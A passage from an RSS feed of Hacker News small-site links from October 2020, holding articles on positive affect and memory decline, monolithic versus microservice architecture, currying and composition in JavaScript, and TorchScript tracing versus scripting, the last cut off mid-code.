<p>Do share this article with your friends on LinkedIn, Twitter, and Facebook. Until next time, take care, <a href="https://ottverse.com/subscribe/">Subscribe</a>, and continue reading OTTVerse.com! </p>

	</div></div>]]>
            </description>
            <link>https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941965</guid>
            <pubDate>Fri, 30 Oct 2020 13:27:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Happier You Are, the Less Likely You‚Äôre to Experience Memory Decline]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941953">thread link</a>) | @conse_lad
<br/>
October 30, 2020 | https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/ | <a href="https://web.archive.org/web/*/https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
		Study says happy people are less likely to experience memory decline with age.	</p><div>
		
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->

<p>The structure and function of brain cells continues to change throughout life, and most of its aspects decline as we age in response to a number of lifestyle factors. As these cells lose their ability to communicate with each other, our ability to retain memory disintegrates. But, is there a way to stop it from happening, or at least slow it down a bit?</p>
<p>Yes, and that‚Äôs by keeping a positive outlook in life.</p>
<p>A <a href="https://www.psychologicalscience.org/news/releases/2020-oct-positive-outlook-memory.html" target="_blank" rel="noopener noreferrer">new study</a> at Association for Psychological Science has revealed that people who lead a cheerful, enthusiastic life full of pride and joy are less likely to experience memory decline as they age. Psychologists have a term for it, and it‚Äôs called ‚Äú<a href="https://link.springer.com/referenceworkentry/10.1007%2F978-0-387-79061-9_2193" target="_blank" rel="noopener noreferrer">positive affect</a>‚Äù. So the more a person experiences a positive affect, the more he or she is likely to retain memories, of which some could even last a lifetime.</p>
<p><img data-attachment-id="39297" data-permalink="https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/happy-people-are-less-likely-to-experience-memory-decline-with-age/" data-orig-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=1920%2C1280&amp;ssl=1" data-orig-size="1920,1280" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="happy people are less likely to experience memory decline with age." data-image-description="" data-medium-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=780%2C520&amp;ssl=1" loading="lazy" src="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=780%2C520&amp;ssl=1" alt="happy people are less likely to experience memory decline with age" width="780" height="520" srcset="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=768%2C512&amp;ssl=1 768w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1536%2C1024&amp;ssl=1 1536w" sizes="(max-width: 780px) 100vw, 780px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=768%2C512&amp;ssl=1 768w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1536%2C1024&amp;ssl=1 1536w" data-lazy-src="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=780%2C520&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<p>For the study, the team looked at data from 991 adults who took part in a national study conducted three times between 1995 and 1996, 2004 and 2006, and 2013 and 2014.</p>
<p>Researchers then gauged the reports on a range of positive emotions the participants had experienced over the past 30 days. They also asked participants to take part in a memory test which consisted of recalling words immediately after a presentation and again 15 minutes later.</p>
<p>After successfully examining the association between positive affect and memory decline, while accounting for factors like age, gender, education, depression, negative affect, and extraversion, they found that individuals with higher levels of positive affect had a better memory retention over the course of almost a decade compared to those that had experienced lesser positive affect.</p>
<p>Positive affectivity has been tied to a <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2895001/" target="_blank" rel="noopener noreferrer">number of favourable health outcomes</a>, including lowering the levels of stress, minimizing severity of depression, promoting longevity and other physiological functioning. And this new finding adds to a burgeoning area of research on the role of positive affect in healthy aging.</p>
<p>The study entitled <strong>‚Äú</strong><span><strong>Positive Affect Is Associated With Less Memory Decline: Evidence From a 9-Year Longitudinal Study‚Äù</strong>&nbsp;</span>has been published in the journal <em><a href="https://journals.sagepub.com/doi/10.1177/0956797620953883" target="_blank" rel="noopener noreferrer">Psychological Science</a></em>.</p>


<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->



	</div></div>]]>
            </description>
            <link>https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941953</guid>
            <pubDate>Fri, 30 Oct 2020 13:24:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monolithic vs. Microservices: Pros and Cons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941760">thread link</a>) | @renanmoura
<br/>
October 30, 2020 | https://renanmf.com/monolithic-microservices-pros-and-cons/ | <a href="https://web.archive.org/web/*/https://renanmf.com/monolithic-microservices-pros-and-cons/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-container"><main id="main" itemscope="itemscope" itemtype="https://schema.org/CreativeWork"><div id="primary" data-v-spacing="top:bottom"><div data-sidebar="right"><section><article id="post-385" data-structure="default:wide"><section data-type="type-1"></section><div><h2>What is a Monolith?</h2><p>A Monolithic system is designed to produce one, self-contained, deliverable.</p><p>This deliverable will then be deployed in a whole bunch of different environments to be tested, validated, and finally, go to production and serve its users.</p><p>Monoliths are well-suited for a wide spectrum of solutions, especially small applications.</p><h3>Some pros of Monoliths</h3><p>It‚Äôs the current status quo on software development, which means everybody is used to think, design and work on systems following this architecture.</p><ul><li>To check the health status of your application is incredibly easy and there are a plethora of tools to help you with that.</li><li>Speaking on tools, on the developer‚Äôs side, our favorite IDE‚Äôs are all heavily optimized to work with monoliths: indexing, finding references, refactoring, debugging, etc.</li><li>Last but not least: the deploy is pretty straightforward! Well, in most cases at least.</li></ul><h3>Some cons of Monoliths</h3><ul><li>Updating the application‚Äôs technology stack gets harder and harder as the codebase grows.</li><li>A CI/CD (Continuous Integration and Continuous Delivery ‚Äì aka Continuous Deployment) flow takes longer as the app becomes more complex, harming the feedback cycle.</li><li>Your system is so complete and full of functionalities that testing it takes forever, either manually or automatically.</li><li>The size of the app also implies a bigger team, which implies <a href="https://www.pmi.org/learning/library/effective-communication-better-project-management-6480">the biggest problem in project management</a>: communication.</li><li>Last but not least, the whole team‚Äôs productivity goes down as the project advances:<ul><li>The developer has too much code to handle and your IDE becomes a bottleneck.</li><li>The product manager has difficulties in planning releases because everything is so tied.</li><li>You have 600 feature branches that have to be synchronized, even if they are not directly related to each other.</li><li>The last point also implies rather complex merges</li></ul></li><li>Scaling is hard: remember Pareto‚Äôs 80/20? Well, if your users use 20% of the functionalities 80% of the time, as you get more users, you can‚Äôt scale only the 20%, you have to scale 100% of the software in production.</li><li>Domino effect: one bug can take down the entire system at once.</li></ul><h2>Enters Microservices</h2><p>A Microservices Architecture is typically described as an approach to divide your application into small and independent services. Done right, these small modules may be reusable and shared in multiple systems. Think about each service as SaaS (Software as a Service) on its own when consumed by other services.</p><h3>Some pros of Microservices</h3><ul><li>CI/CD becomes easier, if you need to update service A, service B will keep running.</li><li>Scalability where it needs to be: you can pinpoint the most used services and give them more RAM and CPU, which is also gonna save you some cash.</li><li>A bug crashing service B doesn‚Äôt take down service A, especially if you have implemented some good caching strategy in service A if it consumes some API in service B.</li><li>You can have small, specialized teams for every service, which diminishes the communication problems.</li><li>It is possible to use different technology stacks for each service and to consider the one that suits better the required features.</li><li>Different microservices can be reused for many systems, e.g., you may have a microservice specifically to deal with payments and share it with all your applications.</li></ul><h3>Some cons of Microservices</h3><ul><li>The health check is more difficult, you have to monitor every service and aggregate logs as well as track the requests passing by each microservice to debug them properly.</li><li>It is no easy task to find the boundaries between services properly, thus a good understanding of the business domain is needed, a good approach is DDD as described in <a href="https://www.amazon.com.br/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215">Domain-Driven Design: Tackling Complexity in the Heart of Software</a>.</li><li>As a distributed system, you have to deal with other issues like network latency and failures.</li><li>Even with independent deploys, some level of coordination is necessary amongst the teams when major changes are made.</li><li>Knowing when and how to migrate from a Monolith to a Microservice.</li></ul><h2>Conclusion</h2><p>This was a first introduction to the topic of Microservices, I plan on doing more posts to explore it even further, concerning the right moment of adoption, actual tools for implementation and design patterns. As a general rule, when in doubt, start with a monolithic approach and move to microservices if needed.</p></div></article></section></div></div></main></div></div>]]>
            </description>
            <link>https://renanmf.com/monolithic-microservices-pros-and-cons/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941760</guid>
            <pubDate>Fri, 30 Oct 2020 13:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Functional Programming in JavaScript, part I ‚Äì Composition]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941678">thread link</a>) | @chrismiaskowski
<br/>
October 30, 2020 | https://11sigma.com/blog/functional-programming-in-js-part-i-composition | <a href="https://web.archive.org/web/*/https://11sigma.com/blog/functional-programming-in-js-part-i-composition">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote><p>This article was originally published on Mateusz's <a href="https://dev.to/mpodlasin/functional-programming-in-js-part-i-composition-currying-lodash-and-ramda-1ohb">dev.to profile</a>.</p><p>Mateusz says about himself: "I write in-depth articles about JavaScript, React and functional programming."</p></blockquote><p>In this series of articles, we will go through a soft introduction to functional programming in JavaScript.</p><p>Each article will be devoted to a different aspect of functional programming. After the theoretical introduction, we will see how those concepts are then used in actual, real world JavaScript libraries.</p><p>This mix of theory and practice will ensure that you get a deep understanding of all the concepts while being able to use them effortlessly in practice in your day to day work.</p><p>Please be aware that this series assumes that you already have some proficiency in writing code with arrays' methods such as <code>map</code>, <code>filter</code>, and <code>reduce</code>. If they still confuse you, let me know, and I will write an article explaining them in-depth.</p><p>Ready? Let's get started!</p><h2>Composition</h2><p>If I had to name in one word what this first article will focus on, it would be <em>composition</em> or <em>composability</em>.</p><p>More specifically, I mean here the art of composing your code from small, reusable functions, almost like composing a lego set from smaller pieces.</p><p>It turns out that a properly written functional code is very composable. What does it mean? It means that it is extremely easy to take a small piece of that code and reuse it in a completely different situation.</p><p>Take a look at this code, written in traditional style:</p><pre><code><span>let</span> result <span>=</span> <span>[</span><span>]</span><span>;</span>

<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>,</span> i <span>&lt;</span> data<span>.</span><span>length</span><span>,</span> i<span>++</span><span>)</span> <span>{</span>
    <span>const</span> num <span>=</span> <span>parseInt</span><span>(</span>data<span>[</span>i<span>]</span><span>,</span> <span>10</span><span>)</span><span>;</span>

    <span>if</span> <span>(</span>num <span>&lt;</span> <span>5</span><span>)</span> <span>{</span>
        result<span>.</span><span>push</span><span>(</span>num<span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre><p>and now compare it to:</p><pre><code><span>const</span> <span>stringToInt</span> <span>=</span> <span>str</span> <span>=&gt;</span> <span>parseInt</span><span>(</span>str<span>,</span> <span>10</span><span>)</span><span>;</span>
<span>const</span> <span>lessThan</span> <span>=</span> <span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span>

<span>const</span> result <span>=</span> data
    <span>.</span><span>map</span><span>(</span>stringToInt<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span><span>;</span></code></pre><p>Those two snippets do the same thing. We first take the <code>data</code> array, which is filled with some strings. We then transform those strings into integers. And finally, we store only those integers that are strictly smaller than 5 in a new array. We keep that array under the <code>result</code> variable.</p><p>So if we got an <code>["1", "6", "3"]</code> array, we would return <code>[1, 3]</code> as a result.</p><p>Depending on which style you are more accustomed to, you will find one of the two above snippets more readable. I believe that the second one is more readable because - not taking into the account little helper functions that we defined - it reads almost like English:</p><p>Take <code>data</code>, <code>mapEach</code>, <code>stringToInt</code> and then <code>filter</code> only those values that are <code>lessThan(5)</code>.</p><p>However, if you are not used to functional style, this second snippet will seem awkward and needlessly convoluted. Are there any objective benefits of writing the code in that style?</p><p>Of course! And that benefit is exactly the composability. Note that we went out of our way to define even the simplest pieces of our code as functions. Thanks to that, we can now use those snippets in entirely new situations without ever writing the same code twice.</p><p>Of course, those reusable <code>stringToInt</code> and <code>lessThan</code> functions are extremely simple, to the point where it arguably is not worth reusing them like that. But keep in mind that this example only serves as a motivation for the whole approach.</p><p>In more complex applications, those functions would be getting more and more complicated. The approach of reusing the most amount of code possible and composing new code from previously written functions will have much more apparent benefits in a bigger codebase.</p><p>Note also that apart from the simplest possible reusability - simply using <code>stringToInt</code> and <code>lessThan</code> functions in different contexts - we also see examples of using higher-order array functions - <code>map</code> and <code>filter</code>. It is key to note that they possess an immense power - they allow you to use functions defined for singular values (for example, strings) on whole arrays of those values (for instance, on arrays of strings).</p><p>This is the first moment when you can see the power of that approach. You wrote two functions - <code>stringToInt</code> and <code>lessThan</code> - that are not supposed to be used on arrays. And yet, by wrapping them in only a few more characters - <code>.map(stringToInt)</code>, <code>.filter(lessThan(5))</code> - you suddenly possess the power to use those functions on whole arrays of values.</p><p>This is precisely what we meant at the beginning. The functional approach allows you to use the same code in entirely different contexts - in fact, here, the same code is even used on completely different types of values! A function that was meant to work only on strings can now work on arrays of strings! That's pretty cool.</p><h2>Currying</h2><p>Perhaps you have already asked yourself - "wait, what is this weird definition of <code>lessThan</code> about?".</p><p>If I asked you to write a <code>lessThan</code> function, you would probably do it like that:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>(</span><span>num<span>,</span> compareTo</span><span>)</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>And yet we did it like that:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>Not only arguments are switched, but also the syntax of a function definition is different. Is this some new, exotic addition to the JavaScript standard?</p><p>In fact, no. What we did here is that we wrote a function that returns another function.</p><p>Function that we are returning is:</p><pre><code><span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>And then we wrap it in another function, that finally provides <code>compareTo</code> variable for it:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>(</span><span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>)</span><span>;</span></code></pre><p>This time we wrapped the returned function in parentheses for better readability.</p><p>Note that we used here the fact that in an arrow function, we can provide returned value directly, instead of the function body. If we wanted to write the body, we might rewrite the above example like so:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>{</span>
    <span>return</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span>
<span>}</span><span>;</span></code></pre><p>In fact, this pattern doesn't really rely on ES6 arrow function syntax. Me might have as well written it in old school function syntax:</p><pre><code><span>function</span><span>(</span><span>compareTo</span><span>)</span> <span>{</span>
    <span>return</span> <span>function</span><span>(</span><span>num</span><span>)</span> <span>{</span>
        <span>return</span> num <span>&lt;</span> compareTo<span>;</span>
    <span>}</span><span>;</span>
<span>}</span></code></pre><p>What ES6 arrow syntax does, however, is that it makes that monstrous code look much nicer:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>That pattern is called currying.</p><p>If you take a function taking some number of parameters:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>(</span><span>a<span>,</span> b<span>,</span> c</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>you can "curry" it (or produce its "curried" version), which looks like that:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>a</span> <span>=&gt;</span> <span>b</span> <span>=&gt;</span> <span>c</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>In this case, the original function accepts three parameters.</p><p>After currying it, we get a function that accepts one parameter <code>a</code>, returns a function that takes one parameter <code>b</code>, then returns a function that accepts one parameter <code>c</code> and finally executes the original function's body.</p><p>Ok, we explained <em>how</em> that mechanism works, but we didn't explain why we even decided to write our functions like that.</p><p>Frankly, the answer is extremely simple. The only reason is so that we could later use the <code>lessThan</code> function like so:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span></code></pre><p>Note that if we used our first definition of that function:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>(</span><span>num<span>,</span> compareTo</span><span>)</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>then applying it in the <code>filter</code> method wouldn't be nearly as nice. We would have to write that code like so:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>num</span> <span>=&gt;</span> <span>lessThan</span><span>(</span>num<span>,</span> <span>5</span><span>)</span><span>)</span></code></pre><p>So again, you see that we wrote our function in a way that makes it compose nicely with methods such as <code>filter</code>.</p><p>It also composes nicely with a <code>map</code>. Writing code like this:</p><pre><code>numbers<span>.</span><span>map</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span></code></pre><p>would return an array of booleans saying if the number on a given place in the array is smaller than 5. For example, running that code on an array <code>[5, 1, 4]</code>, would return an array <code>[false, true, true]</code>.</p><p>So you can see that <code>lessThan</code> function composes now much nicer with other, higher-order functions.</p><p>On top of that, assume we noticed that we use <code>lessThan</code> very often with a number 5 specifically. Maybe that's a very important number, let's say a number of the servers we have in the company.</p><p>This number now appears in several places in our code. But having it hard-coded like that is a very bad practice. What if that number changes at some point, for example, to a 6? We would have to search for all those appearances of 5 and change them to 6 manually. This would be both too cumbersome and error-prone.</p><p>The first solution that comes to mind is to store that number in a variable, a constant with some semantic name that describes what this number means:</p><pre><code><span>const</span> <span>NUMBER_OF_SERVERS</span> <span>=</span> <span>5</span><span>;</span></code></pre><p>Now we can use the constant instead of the number:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>NUMBER_OF_SERVERS</span><span>)</span><span>)</span></code></pre><p>If that number changes (for example, our company buys more servers), we can update it in one place, where that constant is defined.</p><p>This is certainly nicer and very readable, but it's still a tiny bit cumbersome to import two distinct values (<code>lessThan</code> and <code>NUMBER_OF_SERVERS</code>) even though we always want to use them together.</p><p>However, the way we defined the <code>lessThan</code> function allows us to fix that. We can store the returned function in another variable!</p><pre><code><span>const</span> lessThanNumberOfServers <span>=</span> <span>lessThan</span><span>(</span><span>NUMBER_OF_SERVERS</span><span>)</span><span>;</span></code></pre><p>Now, whenever we want to use that function with that specific value, we can import it once and use it directly:</p><pre><code><span>.</span><span>filter</span><span>(</span>lessThanNumberOfServers<span>)</span></code></pre><p>Our function is more composable with other functions, but it also allows us to define new functions in a very easy manner.</p><p>Very often certain values in our functions are only some kind of configuration. Those values do not change very often. In fact, you will often find yourself hard-coding those values inside your functions:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>(</span><span><span>...</span>someArguments</span><span>)</span> <span>=&gt;</span> <span>{</span>
   <span>const</span> <span>SOME_VALUE_THAT_WILL_PROBABLY_NOT_CHANGE</span> <span>=</span> <span>5</span><span>;</span>

   <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>It's sometimes a good idea to put such value as an argument of a curried function and simply create a new function, with this value already set to a value we expect to be the most common:</p><pre><code><span>const</span> <span>someBiggerFunction</span> <span>=</span> <span>(</span><span>someValueThatWillProbablyNotChange</span><span>)</span> <span>=&gt;</span> <span>(</span><span><span>...</span>someArguments</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span>

<span>const</span> someFunction <span>=</span> <span>someBiggerFunction</span><span>(</span><span>5</span><span>)</span><span>;</span></code></pre><p>This pattern is handy because it ultimately gives you the same result - a function with a value hard-coded inside. But at the same time, you get much bigger flexibility. When it turns out it is necessary to set that variable to some ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://11sigma.com/blog/functional-programming-in-js-part-i-composition">https://11sigma.com/blog/functional-programming-in-js-part-i-composition</a></em></p>]]>
            </description>
            <link>https://11sigma.com/blog/functional-programming-in-js-part-i-composition</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941678</guid>
            <pubDate>Fri, 30 Oct 2020 12:51:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mastering TorchScript: Tracing vs. Scripting, Device Pinning, Graph Modification]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941642">thread link</a>) | @briggers
<br/>
October 30, 2020 | https://paulbridger.com/posts/mastering-torchscript/ | <a href="https://web.archive.org/web/*/https://paulbridger.com/posts/mastering-torchscript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  <h5>October 29, 2020</h5>



  
  
  

  


  <h2 id="intro">
  Intro
  <a href="#intro">#</a>
</h2>
<p>TorchScript is one of the most important parts of the Pytorch ecosystem, allowing portable, efficient and nearly seamless deployment. With just a few lines of <code>torch.jit</code> code and some simple model changes you can export an asset that runs anywhere <code>libtorch</code> does. It‚Äôs an important toolset to master if you want to run your models outside the lab at high efficiency.</p>
<p>Good <a href="https://pytorch.org/tutorials/beginner/Intro_to_TorchScript_tutorial.html">introductory material</a> is already available for starting to work with <a href="https://pytorch.org/docs/stable/jit.html">TorchScript</a> including <a href="https://pytorch.org/tutorials/advanced/cpp_export.html">execution in the C++ <code>libtorch</code> runtime</a>, and <a href="https://pytorch.org/docs/stable/jit_language_reference.html">reference material</a> is also provided. This article is a collection of topics going beyond the basics of your first export.</p>
<h2 id="tracing-vs-scripting">
  Tracing vs Scripting
  <a href="#tracing-vs-scripting">#</a>
</h2>
<p>Pytorch provides two methods for generating TorchScript from your model code ‚Äî tracing and scripting ‚Äî but which should you use? Let‚Äôs recap how they work:</p>
<ul>
<li>
<p><a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html"><strong>Tracing.</strong></a> When using <code>torch.jit.trace</code> you‚Äôll provide your model and sample input as arguments. The input will be fed through the model as in regular inference and the executed operations will be traced and recorded into TorchScript. Logical structure will be frozen into the path taken during this sample execution.</p>
</li>
<li>
<p><a href="https://pytorch.org/docs/stable/generated/torch.jit.script.html"><strong>Scripting.</strong></a> When using <code>torch.jit.script</code> you‚Äôll simply provide your model as an argument. TorchScript will be generated from the static inspection of the <code>nn.Module</code> contents (recursively).</p>
</li>
</ul>
<p>It‚Äôs not obvious from the tutorial documentation, but choosing which method to use is a fairly simple and fluid choice:</p>
<h3 id="use-scripting-by-default">
  Use Scripting by Default
  <a href="#use-scripting-by-default">#</a>
</h3>
<p>Because <code>torch.jit.script</code> captures both the operations and full conditional logic of your model, it‚Äôs a great place to start. If your model doesn‚Äôt need any <a href="https://pytorch.org/docs/stable/jit_unsupported.html">unsupported Pytorch functionality</a> and has logic restricted to the <a href="https://pytorch.org/docs/stable/jit_builtin_functions.html#python-built-in-functions">supported subset of Python functions</a> and <a href="https://pytorch.org/docs/stable/jit_python_reference.html">syntax</a>, then <code>torch.jit.script</code> should be all you need.</p>
<p>One major advantage of scripting over tracing is that an export is likely to either fail for a well-defined reason ‚Äî implying a clear code modification ‚Äî or succeed without warnings.</p>
<blockquote>
  <p><strong>Unlike Python, TorchScript is Statically Typed</strong></p>
<p>You will need to be consistent about container element datatypes, and be wary of implicit function signatures. A useful practice is to use type hints in method signatures.</p>

</blockquote>

<p>Despite TorchScript‚Äôs ability to capture conditional logic it does not allow you to run arbitrary Python within <code>libtorch</code> ‚Äî a popular misconception.</p>
<h3 id="use-tracing-if-you-must">
  Use Tracing if You Must
  <a href="#use-tracing-if-you-must">#</a>
</h3>
<p>There are a few special cases in which <code>torch.jit.trace</code> may be useful:</p>
<ul>
<li>If you are unable to modify the model code ‚Äî because you do not have access or ownership ‚Äî you may find scripting the model simply will not work because it uses unsupported Pytorch/Python functionality.</li>
<li>In pursuit of performance or to bake in architectural decisions the logic freezing behavior of tracing might be preferable ‚Äî similar to inlining C/C++ code.</li>
</ul>
<blockquote>
  <p><strong>Pay Close Attention to Tracer Warnings</strong></p>
<p>Due to how tracing can simplify model behavior, each warning should be fully understood and only then ignored (or fixed). Also, be sure to trace in eval mode if you are exporting a model for production inference!</p>

</blockquote>

<h3 id="use-both-together">
  Use Both Together
  <a href="#use-both-together">#</a>
</h3>
<p>Scripted and traced code can be freely mixed, and this is often a great choice. See the existing <a href="https://pytorch.org/">pytorch.org</a> documentation for <a href="https://pytorch.org/docs/stable/jit.html#mixing-tracing-and-scripting">details</a> and <a href="https://pytorch.org/tutorials/beginner/Intro_to_TorchScript_tutorial.html#mixing-scripting-and-tracing">examples</a>.</p>
<h2 id="device-pinning">
  Device Pinning
  <a href="#device-pinning">#</a>
</h2>
<p>If you find yourself using <code>torch.jit.trace</code> on some code, you‚Äôll have to actively deal with some of the gotchas or face performance and portability consequences. Besides addressing any warnings Pytorch emits, you‚Äôll also need to keep an eye out for device pinning. Just like <code>torch.jit.trace</code> records and freezes conditional logic, it will also trace and make constant the values resulting from this logic ‚Äî this can include device constants.</p>
<p>Using this sample code:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>X</span><span>.</span><span>size</span><span>(</span><span>0</span><span>))</span></code></pre></div>
<p>If we trace while executing on CPU or GPU we get this TorchScript (scroll to the right on mobile):</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>ops</span><span>.</span><span>prim</span><span>.</span><span>NumToTensor</span><span>(</span><span>torch</span><span>.</span><span>size</span><span>(</span><span>X</span><span>,</span> <span>0</span><span>))</span>
  <span>_1</span> <span>=</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>annotate</span><span>(</span><span>number</span><span>,</span> <span>_0</span><span>),</span> <span>dtype</span><span>=</span><span>None</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cpu"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>)</span>
  <span>return</span> <span>_1</span></code></pre></div>
<!-- raw HTML omitted -->
<p>You can see that <code>torch.device("cpu")</code> has been inserted as a constant into the generated TorchScript. If we try to get clever with this code:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>X</span><span>.</span><span>size</span><span>(</span><span>0</span><span>),</span> <span>device</span><span>=</span><span>X</span><span>.</span><span>device</span><span>)</span></code></pre></div>
<p>Tracing will now result in TorchScript that is pinned to the tracing device. When traced on GPU, we see this:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span>
